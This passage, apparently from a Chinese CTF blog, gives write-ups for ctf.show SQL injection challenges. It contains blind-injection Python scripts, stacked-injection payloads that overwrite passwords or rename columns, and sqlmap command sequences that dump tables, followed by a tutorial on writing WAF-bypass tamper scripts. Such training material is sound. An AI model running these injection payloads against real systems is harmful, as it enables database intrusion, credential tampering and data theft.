class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot; _&#123;&#125;-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">z = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if((select group_concat(f1ag) from ctfshow_fl0g)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h1><h2 id="update堆叠注入"><a href="#update堆叠注入" class="headerlink" title="update堆叠注入"></a>update堆叠注入</h2><p>把所有的密码都改为111，之后登录就好</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x61646d696e;update`ctfshow_user`set`pass`=0x313131;</span><br><span class="line"># 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围</span><br><span class="line">sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;;&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407180508467.png" alt="image-20220407180508467"></p><h1 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407180601416.png" alt="image-20220407180601416"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br><span class="line">if(preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;, $username))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能是过滤错了吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;select(1)</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407180656002.png" alt="image-20220407180656002"></p><h1 id="web197-198"><a href="#web197-198" class="headerlink" title="web197-198"></a>web197-198</h1><h2 id="alter更改列名堆叠注入"><a href="#alter更改列名堆叠注入" class="headerlink" title="alter更改列名堆叠注入"></a>alter更改列名堆叠注入</h2><p>利用alter更改列名。一开始想着把username更改为pass，然后查出来的就是字符串用户名，和数字0进行弱类型比较就可以了，但是实际尝试发现不行，看了一下发现这题没有检查传入的password是不是数字，而且没有用intval对password进行处理，所以这样不行，那就把id改成pass，然后爆破id就可以了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;alter table `ctfshow_user` change `pass` `feng` varchar(255); alter table `ctfshow_user` change `id` `pass` varchar(255)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;varchar(255);&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;0x61646d696e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登陆成功&quot;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(r.json()[<span class="string">&#x27;msg&#x27;</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#登陆成功 flag is ctfshow&#123;1e8cd464-117c-4863-a8ea-0e7b83d3d9fe&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web199-200"><a href="#web199-200" class="headerlink" title="web199-200"></a>web199-200</h1><h2 id="堆叠登录"><a href="#堆叠登录" class="headerlink" title="堆叠登录"></a>堆叠登录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show tables</span><br><span class="line">ctfshow_user</span><br></pre></td></tr></table></figure><p>show tables;会显示表名,也就是ctfshow_user那么这个时候会将查出来的这个值当成密码,也就是密码为ctfshow_user</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407182514272.png" alt="image-20220407182514272"></p><h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><h2 id="改referer"><a href="#改referer" class="headerlink" title="改referer"></a>改referer</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">探测注入点</span><br><span class="line">python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; --dbs --batch</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; -D &quot;ctfshow_web&quot; --tables --batch</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; -D &quot;ctfshow_web&quot; -T ctfshow_user --columns --batch</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; -D &quot;ctfshow_web&quot; -T ctfshow_user -C &quot;pass&quot; --dump --batch</span><br></pre></td></tr></table></figure><h1 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h1><h2 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --dbs --batch</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; -D ctfshow_web --tables --batch</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; -D ctfshow_web -T ctfshow_user --columns --batch</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; -D ctfshow_web -T ctfshow_user -C pass --dump --batch</span><br></pre></td></tr></table></figure><h1 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h1><h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><p>必须要加index.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --dbs --batch</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web --tables --batch</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user --columns --batch</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump --batch</span><br></pre></td></tr></table></figure><h1 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h1><h2 id="改cookie"><a href="#改cookie" class="headerlink" title="改cookie"></a>改cookie</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://4d60760f-5063-4ed9-9221-e282903a6cd9.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=eq5fptfudtbh83i0c0cefg944a; ctfshow=0b535f51ad8cd475e68035ffa3f7fdf7&quot; -D ctfshow_web -T ctfshow_user -C pass --dump --batch</span><br></pre></td></tr></table></figure><h1 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h1><h2 id="访问安全链接"><a href="#访问安全链接" class="headerlink" title="访问安全链接"></a>访问安全链接</h2><p>可以发现查询数据时先去访问了getToken.php,接着才是查询数据</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407200618827.png" alt="image-20220407200618827"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--safe-url 设置在测试目标地址前访问的安全链接</span><br><span class="line"> --safe-freq 设置两次注入测试前访问安全链接的次数</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --dbs</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web --tables</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flax --columns</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flax -C flagx --dump</span><br></pre></td></tr></table></figure><h1 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --dbs</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web --tables</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flaxc --columns</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flaxc -C flagv --dump</span><br></pre></td></tr></table></figure><h1 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h1><h2 id="sqlmap的tamper编写"><a href="#sqlmap的tamper编写" class="headerlink" title="sqlmap的tamper编写"></a>sqlmap的tamper编写</h2><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p>mytamper.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;doc/COPYING&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW <span class="comment"># 当前脚本调用优先等级</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>(): <span class="comment"># 声明当前脚本适用/不适用的范围，可以为空。</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>): <span class="comment"># 用于篡改Payload、以及请求头的主要函数</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把他保存在sqlmap\tamper路径下,然后使用的时候就加上 –tamper&#x3D;mytamper就好了</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">randomIP</span>():</span><br><span class="line">    numbers = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> numbers <span class="keyword">or</span> numbers[<span class="number">0</span>] <span class="keyword">in</span> (<span class="number">10</span>, <span class="number">172</span>, <span class="number">192</span>):</span><br><span class="line">        numbers = random.sample(xrange(<span class="number">1</span>, <span class="number">255</span>), <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span>.join(<span class="built_in">str</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> numbers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Client-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Real-Ip&quot;</span>] = randomIP()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分别包括import部分 __priority__属性 dependencies函数 tamper函数以及用户自定义的函数</p><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>这一部分我们可以导入sqlmap的内部库,sqlmap为我们提供了很多封装好的函数和数据模型,比如下文的PRORITY就来源于 selmap&#x2F;lib&#x2F;core&#x2F;enums.py</p><h3 id="PRIORITY"><a href="#PRIORITY" class="headerlink" title="PRIORITY"></a>PRIORITY</h3><p>PRIORITY是定义tamper的优先级,PRIORITY有以下几个参数</p><ul><li>LOWEST &#x3D; -100</li><li>LOWER &#x3D; -50</li><li>LOW &#x3D; -10</li><li>NORMAL &#x3D; 0</li><li>HIGH &#x3D; 10</li><li>HIGHER &#x3D; 50 </li><li>HIGHER &#x3D; 50</li><li>HIGHEST &#x3D; 100</li></ul><p>如果使用了多个tamper,sqlmap会根据每一个tamper定义的PRIORITY的参数等级来优先使用等级较高的tamper,如果你有两个tamper需要同时用,需要注意</p><h3 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h3><p>dependencies主要是提示用户,增tamper支持哪些数据可以支持哪些数据库</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;这是我的tamper提示&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>DBMS.MYSQL这个参数代表的是Mysql，其他数据库的参数也可以看这个\sqlmap\lib\core\enums.py</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203541626.png" alt="image-20220407203541626"></p><h3 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h3><p>tamper这个函数是tamper最重要的函数,你要实现的功能,全部写在这个函数里.payload这个参数就是sqlmap的原始注入payload,我们要实现绕过,一般就是针对这个payload的修改.kwargs是针对http头部的修改,如果你是bypass,是通过修改http头,就需要使用这个</p><h3 id="基于payload"><a href="#基于payload" class="headerlink" title="基于payload"></a>基于payload</h3><p>先来基于修改payload来绕过替换关键字，我使用sqlilab的第一关，并且修改了部分代码来把恶意关键字替换为空来避免联合查询，如图</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203858410.png" alt="image-20220407203858410"></p><p>编写tamper来双写绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;select&#x27;</span>,<span class="string">&#x27;seleselectct&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;ununionion&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>没有使用tamper之前，我们加上<code>--tech=U</code>来让sqlmap只测试联合查询注入，<code>--flush-session</code>意思是每次刷新会话，清理上次的缓存。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --dbms=mysql</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203933797.png" alt="image-20220407203933797"></p><p>从burp的流量中看到payload是没有双写的，必然会注入失败。而使用了tamper之后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --tamper=my --dbms=mysql</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203955653.png" alt="image-20220407203955653"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407204001885.png" alt="image-20220407204001885"></p><h3 id="基于http头"><a href="#基于http头" class="headerlink" title="基于http头"></a>基于http头</h3><p>我没使用sqlmap\tamper\xforwardedfor.py的tamper来讲解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Client-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Real-Ip&quot;</span>] = randomIP()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>从kwargs中取出headers数组，然后修改了xff值达到随机IP的效果，不再赘述。</p><h2 id="Tamper-速查"><a href="#Tamper-速查" class="headerlink" title="Tamper 速查"></a>Tamper 速查</h2><table><thead><tr><th>脚本名称</th><th>作用</th></tr></thead><tbody><tr><td>apostrophemask.py</td><td>用utf8代替引号</td></tr><tr><td>equaltolike.py</td><td>like 代替等号</td></tr><tr><td>space2dash.py</td><td>绕过过滤’&#x3D;’ 替换空格字符(“)，(‘’ - ‘)后跟一个破折号注释，一个随机字符串和一个新行(‘n’)</td></tr><tr><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td></tr><tr><td>space2hash.py</td><td>空格替换为#号 随机字符串 以及换行符</td></tr><tr><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td></tr><tr><td>halfversionedmorekeywords.py</td><td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td></tr><tr><td>space2morehash.py</td><td>空格替换为 #号 以及更多随机字符串 换行符</td></tr><tr><td>appendnullbyte.py</td><td>在有效负荷结束位置加载零字节字符编码</td></tr><tr><td>ifnull2ifisnull.py</td><td>绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td></tr><tr><td>space2mssqlblank.py</td><td>空格替换为其它空符号</td></tr><tr><td>base64encode.py</td><td>用base64编码替换</td></tr><tr><td>space2mssqlhash.py</td><td>替换空格</td></tr><tr><td>modsecurityversioned.py</td><td>过滤空格，包含完整的查询版本注释</td></tr><tr><td>space2mysqlblank.py</td><td>空格替换其它空白符号(mysql)</td></tr><tr><td>between.py</td><td>用between替换大于号(&gt;)</td></tr><tr><td>space2mysqldash.py</td><td>替换空格字符(“)(‘ - ‘)后跟一个破折号注释一个新行(‘ n’)</td></tr><tr><td>multiplespaces.py</td><td>围绕SQL关键字添加多个空格</td></tr><tr><td>space2plus.py</td><td>用+替换空格</td></tr><tr><td>bluecoat.py</td><td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为like</td></tr><tr><td>nonrecursivereplacement.py</td><td>取代predefined SQL关键字with表示 suitable for替代(例如 .replace(“SELECT”、””)) filters</td></tr><tr><td>space2randomblank.py</td><td>代替空格字符(“”)从一个随机的空白字符可选字符的有效集</td></tr><tr><td>sp_password.py</td><td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td></tr><tr><td>chardoubleencode.py</td><td>双url编码(不处理以编码的)</td></tr><tr><td>unionalltounion.py</td><td>替换UNION ALL SELECT UNION SELECT</td></tr><tr><td>charencode.py</td><td>url编码</td></tr><tr><td>randomcase.py</td><td>随机大小写</td></tr><tr><td>unmagicquotes.py</td><td>宽字符绕过 GPC addslashes</td></tr><tr><td>randomcomments.py</td><td>用 <code>/**/</code> 